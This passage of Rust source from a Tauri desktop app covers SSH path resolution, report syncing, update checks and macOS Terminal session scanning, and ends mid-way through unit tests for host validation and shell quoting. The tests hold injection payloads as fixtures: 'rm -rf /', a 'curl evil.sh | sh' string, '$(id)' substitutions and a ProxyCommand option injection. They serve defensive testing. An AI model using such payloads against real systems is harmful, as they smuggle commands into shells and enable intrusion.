        let script = format!("bash -c {}", shell_quote(&echo_cmd));
        command.args([&host, &script]);

        let output = command
            .output()
            .map_err(|e| format!("Failed to resolve remote path: {}", e))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            Err(format!("SSH error resolving path: {}", String::from_utf8_lossy(&output.stderr)))
        }
    })
    .await
    .map_err(|e| format!("resolve_remote_path task join error: {}", e))?
}

/// Resolves the local path of a project's `REPORT.html` (produced by the akihtmlreport skill), pulling it from the remote first if the remote's copy is newer. Local-only projects (no remote_host/remote_path) just check local. Errors only when neither side has the file.
///
/// Deliberately thin: mtime comparison reuses `git::get_file_conflict_info` (the existing local/remote stat-diff primitive, used by the SELECT conflict check) and the pull reuses `sync::rsync_pull_file` - no bespoke SSH stat script or rsync invocation here.
#[tauri::command]
pub async fn resolve_report_html(
    local_path: String,
    remote_host: Option<String>,
    remote_path: Option<String>,
) -> Result<String, String> {
    let host = remote_host.unwrap_or_default();
    let rpath = remote_path.unwrap_or_default();

    let local_exists = std::path::Path::new(&local_path).join("REPORT.html").exists();

    let mut remote_exists = false;
    let mut remote_mtime = 0i64;
    let mut local_mtime = 0i64;
    if !host.is_empty() && !rpath.is_empty() {
        let info = crate::git::get_file_conflict_info(
            local_path.clone(),
            host.clone(),
            rpath.clone(),
            vec!["REPORT.html".to_string()],
        )
        .await?
        .into_iter()
        .next()
        .ok_or_else(|| "internal error: no conflict-info result".to_string())?;
        remote_exists = info.remote_exists;
        remote_mtime = info.remote_mtime;
        local_mtime = info.local_mtime;
    }

    if !local_exists && !remote_exists {
        return Err("No REPORT.html found locally or on the remote.".to_string());
    }
    if remote_exists && (!local_exists || remote_mtime > local_mtime) {
        // rsync over SSH: a blocking subprocess wait on the network. It must never run on the
        // command-dispatch thread (CLAUDE.md, never-block-the-UI) - a slow or dead host would
        // freeze the window for as long as rsync's own timeout.
        let (h, rp, lp) = (host.clone(), rpath.clone(), local_path.clone());
        tauri::async_runtime::spawn_blocking(move || {
            crate::sync::rsync_pull_file(&h, &rp, "REPORT.html", &lp)
        })
        .await
        .map_err(|e| format!("resolve_report_html pull task join error: {}", e))??;
    }
    Ok(std::path::Path::new(&local_path).join("REPORT.html").to_string_lossy().to_string())
}

/// Looks for `filename` in `~/Downloads` so the update modal can offer to open an already-downloaded installer instead of re-triggering a browser download. `file_name()` strips any directory components from the (externally-sourced, GitHub API) filename to prevent escaping the Downloads directory.
#[tauri::command]
pub fn find_in_downloads(filename: String) -> Result<Option<String>, String> {
    let safe_name = std::path::Path::new(&filename)
        .file_name()
        .ok_or_else(|| "Invalid filename".to_string())?;
    let home = std::env::var("HOME").map_err(|e| e.to_string())?;
    let path = std::path::Path::new(&home).join("Downloads").join(safe_name);
    Ok(if path.exists() { Some(path.to_string_lossy().to_string()) } else { None })
}

/// Runs on every app startup (`onMounted` in `AppHeader.vue`) plus manual "Check for Updates"  - `curl`'s blocking network wait must never sit on the command-dispatch thread (a slow or dead network would freeze the whole app on launch). `spawn_blocking` per CLAUDE.md's blocking-UI rule.
#[tauri::command]
pub async fn check_for_updates() -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(|| {
        let out = create_command("curl")
            .args([
                "-s",
                // Bounded on both ends. `spawn_blocking` keeps a hung request off the UI thread,
                // but without a timeout that request still pins one OS thread forever - and this
                // runs on every app launch, so a captive-portal-style blackhole leaks a thread per
                // launch for the life of the process.
                "--connect-timeout", "5",
                "--max-time", "15",
                "-H", "User-Agent: aki-dev-sync",
                "https://api.github.com/repos/lacvietanh/aki-dev-sync/releases/latest"
            ])
            .output()
            .map_err(|e| format!("Failed to check for updates: {}", e))?;

        if out.status.success() {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            Ok(stdout)
        } else {
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            Err(if stderr.trim().is_empty() { "Network error checking for updates".to_string() } else { stderr })
        }
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}


#[derive(serde::Serialize, Default)]
pub struct ProjectStackInfo {
    pub is_node: bool,
    pub is_tauri: bool,
    pub is_nuxt: bool,
    pub label: String,
    pub cmd: String,
    pub dev_cmd: String,
    pub build_cmd: String,
}

/// True when `path` looks like a Nuxt project (config file or generated `.nuxt` dir present).
fn is_nuxt_project(path: &std::path::Path) -> bool {
    path.join("nuxt.config.js").exists() || path.join("nuxt.config.ts").exists() || path.join(".nuxt").exists()
}

/// ~8 `exists()` probes on a user-supplied project path - cheap locally, but tens of seconds on a
/// wedged network mount, so the command below runs it off the dispatch thread (stack-tauri A1).
#[tauri::command]
pub async fn check_project_stack(local_path: String) -> ProjectStackInfo {
    tauri::async_runtime::spawn_blocking(move || check_project_stack_blocking(&local_path))
        .await
        // A join failure means the probe never ran; an all-false stack is exactly what "we could not detect anything" already means to the frontend, so no new error state is invented.
        .unwrap_or_default()
}

fn check_project_stack_blocking(local_path: &str) -> ProjectStackInfo {
    let path = std::path::Path::new(local_path);
    let is_node = path.join("package.json").exists();
    let is_tauri = path.join("src-tauri").exists() || path.join("src-tauri/tauri.conf.json").exists();
    let is_nuxt = is_nuxt_project(path);

    let mut pm = "npm";
    let mut run_prefix = "run ";
    if path.join("pnpm-lock.yaml").exists() {
        pm = "pnpm";
        run_prefix = "";
    } else if path.join("yarn.lock").exists() {
        pm = "yarn";
        run_prefix = "";
    } else if path.join("bun.lockb").exists() || path.join("bun.lock").exists() {
        pm = "bun";
        run_prefix = "";
    }

    let (dev_cmd, build_cmd) = if is_tauri {
        (format!("{pm} {run_prefix}tauri dev"), format!("{pm} {run_prefix}build:app"))
    } else if is_nuxt || is_node {
        // Nuxt and plain Node deliberately share one arm: Nuxt's own scaffold names its scripts
        // `dev`/`build` exactly like any other Node project, so splitting them produced two
        // byte-identical branches. `is_nuxt` is still reported separately in the returned struct -
        // the UI labels the stack with it - it just does not change the commands.
        (format!("{pm} {run_prefix}dev"), format!("{pm} {run_prefix}build"))
    } else {
        ("".to_string(), "".to_string())
    };

    // Keep label/cmd for backward compat
    let (label, cmd) = if !dev_cmd.is_empty() {
        ("Run Dev".to_string(), dev_cmd.clone())
    } else {
        ("".to_string(), "".to_string())
    };

    ProjectStackInfo {
        is_node,
        is_tauri,
        is_nuxt,
        label,
        cmd,
        dev_cmd,
        build_cmd,
    }
}

// `run_project_command` (BUILD), `run_project_dev` (DEV) and their shared `run_in_project_terminal`
// helper were removed 2026-07-30: DEV/BUILD now launch into the in-app terminal instead
// (`docs/plan/done/dev-build-in-app-launch.md`), and these external-`Terminal.app` commands had no
// remaining call site once `ProjectTable.vue` switched to `openRunCommand`.

// Spawn-origin ownership registry - see docs/plan/done/terminal-ownership-model.md §3-4, §9. Per-key removal only; never add a bulk clear (multi-entity regression guard).

/// One tagged session: who launched it, and the pid pinned to it on first reconcile (closes the tty
/// recycling gap - macOS can hand a closed tab's tty number to an unrelated new one).
#[derive(Clone)]
struct OwnedSession {
    owner: String,
    pid: Option<u32>,
}

/// `app.manage()`d in `lib.rs`. `Clone` (an `Arc` underneath) so a command can hand its own copy into
/// `spawn_blocking` without holding the Tauri `State` guard across an `.await`.
#[derive(Clone, Default)]
pub struct TerminalOwnership {
    by_tty: Arc<Mutex<HashMap<String, OwnedSession>>>,
}

/// AppleScript's `tty of t` reports `/dev/ttysNNN`; `ps -axo tty=` reports the bare `sNNN` (or `??`
/// for no controlling terminal). One normal form, used on both sides of every lookup, so a session
/// tagged at launch is still found by the scan that reads it back.
fn normalize_tty(raw: &str) -> String {
    raw.strip_prefix("/dev/tty").map(str::to_string).unwrap_or_else(|| raw.to_string())
}

fn record_terminal_owner(state: &TerminalOwnership, tty: &str, owner: String) {
    let mut map = state.by_tty.lock().unwrap();
    map.insert(normalize_tty(tty), OwnedSession { owner, pid: None });
}

fn owner_of(state: &TerminalOwnership, tty: &str) -> Option<String> {
    state.by_tty.lock().unwrap().get(&normalize_tty(tty)).map(|s| s.owner.clone())
}

/// Single funnel for both launch commands; empty tty/owner is a silent no-op, not an error - see docs/plan/done/terminal-ownership-model.md §3-4.
fn tag_terminal_launch(state: &TerminalOwnership, tty: &str, owner: Option<String>) {
    if tty.is_empty() {
        return;
    }
    let Some(owner) = owner else { return };
    record_terminal_owner(state, tty, owner);
}

/// Single funnel for both scan callers (docs/plan/done/terminal-ownership-model.md §9) - pins a still-`None` pid to the tty's lowest live pid on first sight; drops dead entries one key at a time, never a bulk clear.
fn reconcile_terminal_owners(state: &TerminalOwnership, row_of: &HashMap<u32, PsRow>) {
    let mut map = state.by_tty.lock().unwrap();
    let mut dead: Vec<String> = Vec::new();
    for (tty, session) in map.iter_mut() {
        let live_pids: Vec<u32> =
            row_of.values().filter(|r| normalize_tty(&r.tty) == *tty).map(|r| r.pid).collect();
        if live_pids.is_empty() {
            dead.push(tty.clone());
            continue;
        }
        match session.pid {
            None => session.pid = live_pids.iter().copied().min(),
            Some(pid) if !live_pids.contains(&pid) => dead.push(tty.clone()),
            Some(_) => {}
        }
    }
    // Per-key removal only (§9) - deliberately not a `.clear()`, even though every entry in `dead` could in principle be everything the map holds; the shape must not generalize to "wipe it all".
    for tty in dead {
        map.remove(&tty);
    }
}

// ---------------------------------------------------------------------------
// LIVE external-Terminal count (docs/feat/in-app-terminal.md, the `TERM` cell's bottom badge).
//
// Replaces a session-only "how many windows did WE open" counter, which could only ever grow: the
// app can watch itself call `do script`, but never sees the user close that window. The count is
// therefore not remembered at all - it is re-derived from the process table every few seconds, so
// closing a window drops the badge on its own.
// ---------------------------------------------------------------------------

/// Trailing-slash-normalised directory string. `/a/b/` and `/a/b` are the same directory, and `lsof`
/// and a user-typed project path do not agree on which form to use. Root stays `/`.
fn normalize_dir(p: &str) -> &str {
    let t = p.trim_end_matches('/');
    if t.is_empty() {
        "/"
    } else {
        t
    }
}

/// One row of the process table, as far as the external-terminal scan cares about it.
///
/// `list_terminal_sessions` only ever needed pid -> ppid; `describe_terminal_sessions` needs enough
/// to describe a session to a human (what is running, on which tty, for how long). Both are served
/// by ONE `ps` invocation and ONE parser rather than two formats drifting apart - the badge and the
/// detail modal must never be able to disagree about which processes exist.
#[derive(serde::Serialize, Clone, Debug)]
pub struct PsRow {
    pub pid: u32,
    pub ppid: u32,
    /// `ps` prints `??` for a process with no controlling terminal. Kept verbatim: inventing
    /// `"none"` here would just be a second spelling of the same fact.
    pub tty: String,
    /// Elapsed run time exactly as `ps -o etime` formats it (`MM:SS`, `HH:MM:SS`, `D-HH:MM:SS`).
    /// Not parsed into seconds: it is only ever displayed, and re-formatting it would be one more
    /// place to get wrong for zero gain.
    pub etime: String,
    pub command: String,
}

/// Splits a `ps` line into its first `n` whitespace-delimited columns plus the untouched remainder.
///
/// Written as an offset walk rather than `split_whitespace().nth(n)` + `line.find(..)`: `find`
/// returns the FIRST occurrence of that token anywhere in the line, and a command line very often
/// repeats an earlier column (`ps` prints tty `s000` for a shell whose command contains `s000`,
/// a pid appears inside `--pid=1234`). That would silently slice the command at the wrong byte.
fn split_columns(line: &str, n: usize) -> Option<(Vec<&str>, &str)> {
    let mut cols = Vec::with_capacity(n);
    let mut rest = line.trim_start();
    for _ in 0..n {
        let end = rest.find(char::is_whitespace)?;
        cols.push(&rest[..end]);
        rest = rest[end..].trim_start();
    }
    Some((cols, rest))
}

/// Parses `ps -axo pid=,ppid=,tty=,etime=,command=` output.
///
/// The first four columns never contain whitespace; the remainder is the command line verbatim,
/// spaces and all, which is precisely what must not be tokenised (a path with a space in it is
/// ordinary on macOS).
fn parse_ps_rows(out: &str) -> Vec<PsRow> {
    let mut rows = Vec::new();
    for line in out.lines() {
        let Some((cols, command)) = split_columns(line, 4) else {
            continue;
        };
        let (Ok(pid), Ok(ppid)) = (cols[0].parse::<u32>(), cols[1].parse::<u32>()) else {
            continue;
        };
        rows.push(PsRow {
            pid,
            ppid,
            tty: cols[2].to_string(),
            etime: cols[3].to_string(),
            command: command.trim_end().to_string(),
        });
    }
    rows
}

fn ppids_from_rows(rows: &[PsRow]) -> HashMap<u32, u32> {
    rows.iter().map(|r| (r.pid, r.ppid)).collect()
}

/// Parses `lsof -F pn` output into pid -> cwd. Field lines are `p<pid>` (starts a process set) then
/// `n<path>` for the one fd we asked for (`-d cwd`).
fn parse_lsof_cwds(out: &str) -> HashMap<u32, String> {
    let mut map = HashMap::new();
    let mut current: Option<u32> = None;
    for line in out.lines() {
        match line.as_bytes().first() {
            Some(b'p') => current = line[1..].trim().parse::<u32>().ok(),
            Some(b'n') => {
                if let Some(pid) = current {
                    map.entry(pid).or_insert_with(|| line[1..].to_string());
                }
            }
            _ => {}
        }
    }
    map
}

/// Every pid reachable downward from `roots` (Terminal -> login -> zsh -> whatever the user ran),
/// roots excluded: Terminal.app's own cwd is not a shell standing anywhere.
fn descendants_of(ppid_of: &HashMap<u32, u32>, roots: &[u32]) -> Vec<u32> {
    let mut children: HashMap<u32, Vec<u32>> = HashMap::new();
    for (pid, ppid) in ppid_of {
        children.entry(*ppid).or_default().push(*pid);
    }
    let mut out = Vec::new();
    let mut queue: Vec<u32> = roots.to_vec();
    let mut seen: std::collections::HashSet<u32> = roots.iter().copied().collect();
    while let Some(pid) = queue.pop() {
        if let Some(kids) = children.get(&pid) {
            for kid in kids {
                if seen.insert(*kid) {
                    out.push(*kid);
                    queue.push(*kid);
                }
            }
        }
    }
    out
}

/// Defensive bound on the `lsof` argument list. A Terminal tree of more than this many processes is
/// pathological; truncating keeps the command line (and the scan's cost) bounded.
const MAX_SCANNED_PIDS: usize = 200;

/// Whether `pid` is the ROOT of its cwd subtree (its parent's cwd differs, or is unknown) - one
/// window/tab, not each process inside it. `describe_terminal_sessions` always applied this test
/// inline; extracted here so the new `list_terminal_sessions` (S1,
/// docs/plan/done/terminal-ownership-model.md §10) shares it instead of copying it a second time.
fn is_subtree_root(tree: &TerminalTree, pid: u32) -> bool {
    let Some(cwd) = tree.cwd_of.get(&pid) else { return false };
    let parent_same_cwd = tree
        .ppid_of
        .get(&pid)
        .and_then(|pp| tree.cwd_of.get(pp))
        .map(|pc| normalize_dir(pc) == normalize_dir(cwd))
        .unwrap_or(false);
    !parent_same_cwd
}

/// Compact per-session fact - no command line, no descendants - polled every 5s for the badge
/// (`describe_terminal_sessions` is the on-demand detail call that adds those). Zero-argument by
/// design: attributing a session to a project is now a frontend decision
/// (`src/utils/terminalOwnership.js`, §3's priority rule), so the backend only reports what it knows -
/// the session's own facts, plus the spawn-origin `owner` tag if one was recorded at launch.
#[derive(serde::Serialize, Clone, Debug)]
pub struct TerminalSessionSummary {
    pub pid: u32,
    pub ppid: u32,
    pub tty: String,
    pub cwd: String,
    pub owner: Option<String>,
}

/// Replaces `count_external_terminals` (docs/plan/done/terminal-ownership-model.md §10 S1/S2): same
/// scan, same subtree-root rule, but returns the session inventory itself instead of pre-bucketing by
/// a `paths` argument - bucketing moved to the frontend's pure attribution module.
#[tauri::command]
pub async fn list_terminal_sessions(
    state: tauri::State<'_, TerminalOwnership>,
) -> Result<Vec<TerminalSessionSummary>, String> {
    let ownership = state.inner().clone();
    tauri::async_runtime::spawn_blocking(move || {
        let Some(tree) = scan_terminal_tree(&ownership)? else {
            return Ok(vec![]);
        };
        let mut sessions: Vec<TerminalSessionSummary> = tree
            .cwd_of
            .iter()
            .filter(|(pid, _)| is_subtree_root(&tree, **pid))
            .filter_map(|(pid, cwd)| {
                let row = tree.row_of.get(pid)?;
                Some(TerminalSessionSummary {
                    pid: row.pid,
                    ppid: row.ppid,
                    tty: row.tty.clone(),
                    cwd: cwd.clone(),
                    owner: owner_of(&ownership, &row.tty),
                })
            })
            .collect();
        // Deterministic order - HashMap iteration order is arbitrary and a reshuffling poll reads as a bug.
        sessions.sort_by_key(|s| s.pid);
        Ok(sessions)
    })
    .await
    .map_err(|e| format!("list_terminal_sessions task join error: {}", e))?
}

/// One external `Terminal.app` window/tab, as the detail modal shows it.
///
/// "One session" is the SAME rule the badge counts by (`is_subtree_root`): the ROOT of a
/// cwd subtree, i.e. the shell, not the four processes it spawned. Keeping one rule for both is what
/// guarantees that **the sessions listed for a given project always match that project's badge** -
/// a second, parallel definition of "a session" is exactly how the two would come to disagree.
///
/// The TOTALS are not comparable and are not meant to be: this list also includes sessions standing
/// somewhere that is not a project at all (`project_path: None`), because "what else do I have
/// open" is half the reason to open the modal. Only the per-project counts are the same fact.
#[derive(serde::Serialize, Clone, Debug)]
pub struct ExternalTerminalSession {
    pub pid: u32,
    pub ppid: u32,
    pub tty: String,
    pub etime: String,
    /// The session's own command - the login shell (`-zsh`), after `promote_past_login` has walked
    /// down from macOS's `login -pf <user>` wrapper, which shares the shell's cwd and would
    /// otherwise be what the subtree-root rule picks.
    pub command: String,
    pub cwd: String,
    /// Which of the requested project paths this session's cwd matched, if any. `None` = a Terminal
    /// window standing somewhere else entirely; still listed, because "what else is open" is half
    /// the reason to open this modal.
    pub project_path: Option<String>,
    /// What is actually RUNNING inside this session: the root's descendants, nearest first. Empty
    /// means an idle shell sitting at its prompt. This is the MVP stand-in for "see the screen" -
    /// we cannot read the window's pixels, but we can say truthfully what it is executing.
    pub running: Vec<PsRow>,
    /// Spawn-origin tag (S3/S6): the project id or global-scope token this session was launched with, if any. `None` for a session opened by hand, from before the app started, or whose tag never landed - the frontend resolves this against its own `projects` list at read time (§4: "listed" is a frontend question), so this field alone never asserts a project name.
    pub owner: Option<String>,
}

/// Detail behind the external-terminal badge: every `Terminal.app` session and what runs in it.
/// Renamed from `list_external_terminals` (docs/plan/done/terminal-ownership-model.md §10 S1) - the
/// old name differed from `list_terminal_sessions` by one word for two very different cadences,
/// which was a naming hazard worth retiring while the file was open.
///
/// `paths` still drives `project_path` here (unlike `list_terminal_sessions`): the modal
/// (`ExternalTerminalsModal.vue`) reads `project_path` for its "in X's folder" adoption label, so
/// dropping the argument now - as §4's command table describes as the end state - would silently
/// break that label without a modal-side rewrite (S6), which is out of this step's scope.
///
/// Same three subprocesses as `list_terminal_sessions`, on the blocking pool for the same reason
/// (CLAUDE.md never-block-the-UI). Called on demand from the modal, NOT on the 5s badge cadence -
/// this returns command lines for every process in the Terminal tree and has no business being
/// polled.
#[tauri::command]
pub async fn describe_terminal_sessions(
    paths: Vec<String>,
    state: tauri::State<'_, TerminalOwnership>,
) -> Result<Vec<ExternalTerminalSession>, String> {
    let ownership = state.inner().clone();
    tauri::async_runtime::spawn_blocking(move || {
        let Some(tree) = scan_terminal_tree(&ownership)? else {
            return Ok(vec![]);
        };
        // Canonical form -> the ORIGINAL path string the caller knows the project by. The modal
        // matches sessions back to projects on the string it already holds, so resolving the
        // symlink here (and reporting the un-resolved name) keeps that lookup honest.
        let canonical = canonicalize_all(&paths);
        let mut project_of: HashMap<&str, &str> = HashMap::new();
        for (orig, canon) in paths.iter().zip(canonical.iter()) {
            project_of.entry(normalize_dir(canon)).or_insert(orig.as_str());
        }

        let mut sessions: Vec<ExternalTerminalSession> = Vec::new();
        for (pid, cwd) in &tree.cwd_of {
            if !is_subtree_root(&tree, *pid) {
                continue;
            }
            let Some(root_row) = tree.row_of.get(pid) else { continue };
            // `login -pf <user>` is what Terminal.app actually spawns, and it shares its cwd with
            // the shell underneath it - so for a session sitting in its start directory the subtree
            // root is `login`, not `-zsh`, and the modal would name the wrapper instead of the
            // shell while listing the shell as "running". Promote past it: describe the session by
            // the process a person would call the terminal's shell.
            let row = promote_past_login(&tree, root_row);
            let running: Vec<PsRow> = descendants_of(&tree.ppid_of, &[row.pid])
                .into_iter()
                .filter_map(|k| tree.row_of.get(&k).cloned())
                .collect();
            sessions.push(ExternalTerminalSession {
                pid: row.pid,
                ppid: row.ppid,
                tty: row.tty.clone(),
                etime: row.etime.clone(),
                command: row.command.clone(),
                cwd: cwd.clone(),
                project_path: project_of.get(normalize_dir(cwd)).map(|s| s.to_string()),
                running,
                owner: owner_of(&ownership, &row.tty),
            });
        }
        // Sessions matching a known project first (that is what the user opened the modal for),
        // then by pid so the list does not reshuffle between refreshes - HashMap iteration order is
        // arbitrary and a jumping list reads as a bug.
        sessions.sort_by(|a, b| {
            b.project_path
                .is_some()
                .cmp(&a.project_path.is_some())
                .then(a.pid.cmp(&b.pid))
        });
        Ok(sessions)
    })
    .await
    .map_err(|e| format!("describe_terminal_sessions task join error: {}", e))?
}

/// Is this `ps` command line macOS's `login` wrapper rather than the user's shell?
///
/// Matched on the executable word alone (`login`, `/usr/bin/login`), never on a substring of the
/// whole line - a shell running `git log --oneline` or a script called `login-check.sh` must not be
/// mistaken for it.
fn is_login_wrapper(command: &str) -> bool {
    let exe = command.split_whitespace().next().unwrap_or("");
    exe == "login" || exe.ends_with("/login")
}

/// Walks down from a `login` wrapper to the shell it launched, staying inside the same cwd. Returns
/// `row` unchanged when it is not a wrapper, or when the chain does not resolve (a `login` with no
/// readable child is still a session, and reporting it honestly beats dropping it).
fn promote_past_login(tree: &TerminalTree, row: &PsRow) -> PsRow {
    let mut current = row.clone();
    // Bounded: `login` nests at most once in practice, but a cycle in a hand-built ppid map (or a pathological tree) must not spin forever.
    for _ in 0..4 {
        if !is_login_wrapper(&current.command) {
            break;
        }
        let cwd = tree.cwd_of.get(&current.pid);
        let child = tree
            .row_of
            .values()
            .filter(|r| r.ppid == current.pid)
            .find(|r| match (cwd, tree.cwd_of.get(&r.pid)) {
                (Some(a), Some(b)) => normalize_dir(a) == normalize_dir(b),
                _ => false,
            });
        match child {
            Some(c) => current = c.clone(),
            None => break,
        }
    }
    current
}

/// Canonicalised so a project stored via a symlinked path still matches the real path `lsof`
/// reports. A path that cannot be canonicalised (removed directory, unmounted volume) falls back to
/// itself and simply matches nothing - never an error, since "that project has no terminal open" is
/// the correct answer in that state.
fn canonicalize_all(paths: &[String]) -> Vec<String> {
    paths
        .iter()
        .map(|p| {
            std::fs::canonicalize(p)
                .map(|c| c.to_string_lossy().to_string())
                .unwrap_or_else(|_| p.clone())
        })
        .collect()
}

/// The shared result of ONE scan of `Terminal.app`'s process tree.
struct TerminalTree {
    /// Every process on the machine, pid -> ppid. Full table on purpose: `descendants_of` walks
    /// downward from Terminal and needs parents outside the tree to do it.
    ppid_of: HashMap<u32, u32>,
    /// Terminal descendants only, pid -> cwd.
    cwd_of: HashMap<u32, String>,
    /// Terminal descendants only, pid -> its `ps` row.
    row_of: HashMap<u32, PsRow>,
}

/// `pgrep -x Terminal` + one `ps` + one batched `lsof`, shared by the badge and the detail modal.
///
/// `Ok(None)` means "there is nothing to report" - Terminal is not running, or its tree has no
/// descendants. That is not an error: it is the ordinary state of a Mac with no terminal open, and
/// both callers turn it into an empty answer rather than a failure. macOS-only: this app only ever
/// opens `Terminal.app`, so no other terminal emulator is probed.
///
/// Reconciles `ownership` against whatever this scan finds (S3, §4's lifecycle table) before
/// returning, on every branch - including the empty ones, where an empty row set correctly drops any
/// registry entry left over from a session that has since closed. This is the single funnel both the
/// 5s badge poll and the on-demand detail call fall through, so reconcile never needs a second call
/// site.
fn scan_terminal_tree(ownership: &TerminalOwnership) -> Result<Option<TerminalTree>, String> {
    #[cfg(not(target_os = "macos"))]
    {
        reconcile_terminal_owners(ownership, &HashMap::new());
        return Ok(None);
    }

    #[cfg(target_os = "macos")]
    {
        let pgrep = create_command("pgrep")
            .args(["-x", "Terminal"])
            .output()
            .map_err(|e| format!("Failed to look for Terminal.app: {}", e))?;
        let terminal_pids: Vec<u32> = String::from_utf8_lossy(&pgrep.stdout)
            .lines()
            .filter_map(|l| l.trim().parse::<u32>().ok())
            .collect();
        if terminal_pids.is_empty() {
            reconcile_terminal_owners(ownership, &HashMap::new());
            return Ok(None);
        }

        let ps = create_command("ps")
            .args(["-axo", "pid=,ppid=,tty=,etime=,command="])
            .output()
            .map_err(|e| format!("Failed to enumerate processes: {}", e))?;
        let rows = parse_ps_rows(&String::from_utf8_lossy(&ps.stdout));
        let ppid_of = ppids_from_rows(&rows);

        let mut kids = descendants_of(&ppid_of, &terminal_pids);
        kids.truncate(MAX_SCANNED_PIDS);
        if kids.is_empty() {
            reconcile_terminal_owners(ownership, &HashMap::new());
            return Ok(None);
        }
        let kid_set: std::collections::HashSet<u32> = kids.iter().copied().collect();
        let row_of: HashMap<u32, PsRow> = rows
            .into_iter()
            .filter(|r| kid_set.contains(&r.pid))
            .map(|r| (r.pid, r))
            .collect();

        let pid_list = kids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        // `lsof` exits non-zero when any listed pid has already died between the `ps` and this
        // call - a completely ordinary race, so the status is ignored and stdout is parsed for
        // whatever did resolve.
        let lsof = create_command("lsof")
            .args(["-a", "-d", "cwd", "-p", &pid_list, "-F", "pn"])
            .output()
            .map_err(|e| format!("Failed to read process directories: {}", e))?;
        let cwd_of = parse_lsof_cwds(&String::from_utf8_lossy(&lsof.stdout));

        reconcile_terminal_owners(ownership, &row_of);
        Ok(Some(TerminalTree { ppid_of, cwd_of, row_of }))
    }
}

/// Six `exists()` probes plus a whole-file read, all on a user-supplied project path that may live
/// on a network volume - off the dispatch thread (stack-tauri A1).
#[tauri::command]
pub async fn read_project_changelog(local_path: String) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let path = std::path::Path::new(&local_path);
        let names = ["CHANGELOG.md", "changelog.md", "CHANGELOG.txt", "changelog.txt", "CHANGELOG", "changelog"];
        for name in names {
            let file_path = path.join(name);
            if file_path.exists() {
                let bytes = std::fs::read(file_path)
                    .map_err(|e| format!("Failed to read file: {}", e))?;
                return Ok(String::from_utf8_lossy(&bytes).into_owned());
            }
        }
        Err("No changelog file found".to_string())
    })
    .await
    .map_err(|e| format!("spawn_blocking panicked: {}", e))?
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn remote_host_accepts_hostname() {
        assert!(validate_remote_host("myserver").is_ok());
    }

    #[test]
    fn remote_host_accepts_user_at_host() {
        assert!(validate_remote_host("user@myserver").is_ok());
    }

    #[test]
    fn remote_host_accepts_dotted_hostname() {
        assert!(validate_remote_host("prod.example.com").is_ok());
    }

    #[test]
    fn remote_host_accepts_ip() {
        assert!(validate_remote_host("192.168.1.100").is_ok());
    }

    #[test]
    fn remote_host_rejects_semicolon() {
        assert!(validate_remote_host("host; rm -rf /").is_err());
    }

    #[test]
    fn remote_host_rejects_backtick() {
        assert!(validate_remote_host("host`cmd`").is_err());
    }

    #[test]
    fn remote_host_rejects_space() {
        assert!(validate_remote_host("my host").is_err());
    }

    #[test]
    fn applescript_escape_backslash() {
        assert_eq!(applescript_escape("a\\b"), "a\\\\b");
    }

    #[test]
    fn applescript_escape_double_quote() {
        assert_eq!(applescript_escape("say \"hi\""), "say \\\"hi\\\"");
    }

    #[test]
    fn applescript_escape_clean_string() {
        assert_eq!(applescript_escape("/Users/aki/app"), "/Users/aki/app");
    }

    #[test]
    fn applescript_escape_tilde_path() {
        assert_eq!(applescript_escape("$HOME/app"), "$HOME/app");
    }

    #[test]
    fn applescript_escape_newline() {
        // A raw newline would end the AppleScript string literal mid-statement.
        assert_eq!(applescript_escape("a\nb"), "a\\nb");
    }

    #[test]
    fn shell_quote_plain_path() {
        assert_eq!(shell_quote("/Users/aki/app"), "'/Users/aki/app'");
    }

    #[test]
    fn shell_quote_space() {
        assert_eq!(shell_quote("/Users/aki/my app"), "'/Users/aki/my app'");
    }

    #[test]
    fn shell_quote_single_quote() {
        // The one character that needs work: close, escaped literal, reopen.
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn shell_quote_double_quote() {
        assert_eq!(shell_quote("say \"hi\""), "'say \"hi\"'");
    }

    #[test]
    fn shell_quote_command_substitution() {
        assert_eq!(shell_quote("/tmp/$(id)"), "'/tmp/$(id)'");
    }

    #[test]
    fn shell_quote_backtick() {
        assert_eq!(shell_quote("/tmp/`id`"), "'/tmp/`id`'");
    }

    #[test]
    fn shell_quote_backslash() {
        // Inside single quotes a backslash is literal - it must NOT be doubled.
        assert_eq!(shell_quote("a\\b"), "'a\\b'");
    }

    #[test]
    fn shell_quote_unicode() {
        assert_eq!(shell_quote("/Users/aki/Tài liệu"), "'/Users/aki/Tài liệu'");
    }

    #[test]
    fn shell_quote_injection_attempt_stays_one_word() {
        // The exact payload from plan §2.2: everything after the first `"` used to be executed.
        let quoted = shell_quote("/tmp/x\"; curl evil.sh | sh; :\"");
        assert_eq!(quoted, "'/tmp/x\"; curl evil.sh | sh; :\"'");
        // No unescaped quote can terminate the word early.
        assert!(!quoted[1..quoted.len() - 1].contains("'"));
    }

    #[test]
    fn shell_quote_remote_path_expands_bare_tilde() {
        assert_eq!(shell_quote_remote_path("~"), "\"$HOME\"");
        assert_eq!(shell_quote_remote_path("$HOME"), "\"$HOME\"");
    }

    #[test]
    fn shell_quote_remote_path_keeps_tilde_prefix_expandable() {
        assert_eq!(shell_quote_remote_path("~/www/site"), "\"$HOME\"/'www/site'");
        assert_eq!(shell_quote_remote_path("$HOME/www/site"), "\"$HOME\"/'www/site'");
    }

    #[test]
    fn shell_quote_remote_path_quotes_absolute_path() {
        assert_eq!(shell_quote_remote_path("/srv/my app"), "'/srv/my app'");
    }

    #[test]
    fn shell_quote_remote_path_freezes_substitution_after_tilde() {
        // Only the leading `~` expands; a `$(…)` later in the path must not.
        assert_eq!(shell_quote_remote_path("~/$(id)"), "\"$HOME\"/'$(id)'");
    }

    #[test]
    fn shell_quote_remote_path_handles_quote_after_tilde() {
        assert_eq!(shell_quote_remote_path("~/it's"), "\"$HOME\"/'it'\\''s'");
    }

    #[test]
    fn a_host_that_looks_like_an_ssh_option_is_refused() {
        // The payload that made this a blocker: every character is in the allowlist, so only the leading-dash rule stops it. ssh would read it as an option and run the command locally.
        assert!(validate_remote_host("-oProxyCommand=touch /tmp/pwned").is_err());
